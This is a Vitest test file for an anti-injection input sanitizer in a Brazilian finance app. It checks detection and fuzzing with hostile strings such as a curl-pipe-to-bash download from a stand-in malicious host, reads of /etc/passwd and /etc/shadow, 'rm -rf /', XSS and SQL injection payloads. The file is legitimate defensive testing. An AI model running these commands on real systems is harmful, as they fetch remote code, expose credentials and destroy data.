import { describe, it, expect, beforeEach } from 'vitest';
import {
  verifyExactInput,
  inspectForCommandsAndScripts,
  safeMonetaryInput,
  safeRateInput,
  safeMonthsInput,
  safeParseNumber,
  getLocalOperationalIncidents,
  clearLocalOperationalIncidents,
  SCRIPT_AND_COMMAND_SIGNATURES
} from '../src/lib/inputEncapsulator';

describe('Blindagem Anti-Injeção e Verificação Exata de Inputs (Zyconomes)', () => {
  beforeEach(() => {
    clearLocalOperationalIncidents();
  });

  describe('1. Verificação de Assinaturas de Comandos e Scripts', () => {
    it('detecta injeção de script HTML (<script>)', () => {
      const payload = '<script>alert("xss")</script>';
      const check = inspectForCommandsAndScripts(payload);
      expect(check.hasThreat).toBe(true);
      expect(check.detectedThreats).toContain('XSS Script Tag');
      expect(check.threatCategory).toBe('SCRIPT_INJECTION');
    });

    it('detecta injeções de eventos DOM (onload, onerror, onclick)', () => {
      const payloads = [
        '<img src=x onerror=alert(1)>',
        'onload=fetch("http://evil.com")',
        '1000" onclick="evilCode()',
      ];
      for (const p of payloads) {
        const check = inspectForCommandsAndScripts(p);
        expect(check.hasThreat).toBe(true);
      }
    });

    it('detecta comandos shell perigosos de terminal (sudo, rm, curl, bash)', () => {
      const payloads = [
        'sudo rm -rf /',
        'curl https://malicious.domain/exploit.sh | bash',
        'cat /etc/passwd',
        '1000; whoami',
      ];
      for (const p of payloads) {
        const check = inspectForCommandsAndScripts(p);
        expect(check.hasThreat).toBe(true);
      }
    });

    it('detecta injeções estruturadas SQL (DROP TABLE, UNION SELECT, 1=1)', () => {
      const payloads = [
        '15000; DROP TABLE users; --',
        'SELECT * FROM accounts WHERE id = 1',
        "1000' OR 1=1 --",
        'UNION SELECT password FROM admin',
      ];
      for (const p of payloads) {
        const check = inspectForCommandsAndScripts(p);
        expect(check.hasThreat).toBe(true);
      }
    });

    it('detecta injeções de código executável em runtime (require, process.exit)', () => {
      const payload = 'require("crypto")';
      const check = inspectForCommandsAndScripts(payload);
      expect(check.hasThreat).toBe(true);
      expect(check.detectedThreats).toContain('Module Import / Process Exit');
      expect(check.threatCategory).toBe('CODE_EXECUTION');
    });
  });

  describe('2. Sanitização Exata de Inputs Numéricos Sem Travar o Sistema', () => {
    it('extrai valor numérico puro de payload de injeção SQL sem travar a aplicação', () => {
      const input = '15000; DROP TABLE users; --';
      const result = verifyExactInput(input, 'income', 5000);
      
      expect(result.isValidExactNumeric).toBe(false);
      expect(result.hasCommandOrScriptThreat).toBe(true);
      expect(result.sanitizedValue).toBe(15000);
      expect(result.wasSanitized).toBe(true);
    });

    it('rejeita script XSS puro e aplica fallback padrão seguro com registro de incidente', () => {
      const input = '<script>window.location="http://phishing.com"</script>';
      const result = verifyExactInput(input, 'savings', 1000);
      
      expect(result.isValidExactNumeric).toBe(false);
      expect(result.hasCommandOrScriptThreat).toBe(true);
      expect(result.sanitizedValue).toBe(1000); // fallback aplicado
      expect(result.wasSanitized).toBe(true);

      const incidents = getLocalOperationalIncidents();
      expect(incidents.length).toBeGreaterThan(0);
      expect(incidents[0].fieldId).toBe('savings');
      expect(incidents[0].errorReason).toContain('Injeção de comando/script');
    });

    it('sanitiza comandos shell com dígitos misturados e preserva apenas números', () => {
      const input = 'curl 192.168.1.1:8080/hack && 2500';
      const result = verifyExactInput(input, 'monthlyContribution', 100);
      
      expect(result.hasCommandOrScriptThreat).toBe(true);
      expect(typeof result.sanitizedValue).toBe('number');
      expect(Number.isFinite(result.sanitizedValue)).toBe(true);
      expect(result.sanitizedValue).toBeGreaterThan(0);
    });

    it('filtra caracteres alfabéticos espúrios em campos que devem ser estritamente números', () => {
      const input = 'dez mil reais e quinhentos 10500';
      const result = verifyExactInput(input, 'expenses', 0);
      
      expect(result.sanitizedValue).toBe(10500);
      expect(result.wasSanitized).toBe(true);
    });
  });

  describe('3. Entrada Fiduciária Legítima (Sem Falsos Positivos)', () => {
    it('processa perfeitamente valores formatados em moeda brasileira pt-BR (R$)', () => {
      expect(safeMonetaryInput('R$ 15.000,00', 'income')).toBe(15000);
      expect(safeMonetaryInput('9.500,50', 'expenses')).toBe(9500.5);
      expect(safeMonetaryInput(25000, 'savings')).toBe(25000);
    });

    it('processa taxas de juros e percentuais corretamente', () => {
      expect(safeRateInput('11,75%', 'interestRate')).toBe(11.75);
      expect(safeRateInput(10.5, 'interestRate')).toBe(10.5);
    });

    it('processa e arredonda prazos em meses com precisão', () => {
      expect(safeMonthsInput('360', 'period_months')).toBe(360);
      expect(safeMonthsInput('24,4', 'period_months')).toBe(24);
    });
  });

  describe('4. Estabilidade Sob Ataque Fuzzing (Tolerância Zero a Falhas)', () => {
    it('resiste a uma bateria de 20 vetores hostis de injeção mantendo números seguros e sem exceções', () => {
      const adversarialInputs = [
        '<svg/onload=alert(1)>',
        'javascript:alert(document.domain)',
        'eval("malicious code")',
        '1000; cat /etc/shadow',
        'rm -rf / --no-preserve-root',
        'DROP TABLE accounts;',
        "1000' OR '1'='1",
        'exec("cmd.exe /c calc")',
        '${7*7}',
        '{{constructor.constructor("alert(1)")()}}',
        'NaN',
        'Infinity',
        '-Infinity',
        'undefined',
        'null',
        '[object Object]',
        '9999999999999999999999999999999999',
        '-5000',
        '   ',
        '#@!$%¨&*()_+'
      ];

      for (const input of adversarialInputs) {
        expect(() => {
          const val = safeMonetaryInput(input, 'fuzz_field', 1000);
          expect(typeof val).toBe('number');
          expect(Number.isFinite(val)).toBe(true);
          expect(val).toBeGreaterThanOrEqual(0);
        }).not.toThrow();
      }
    });
  });
});
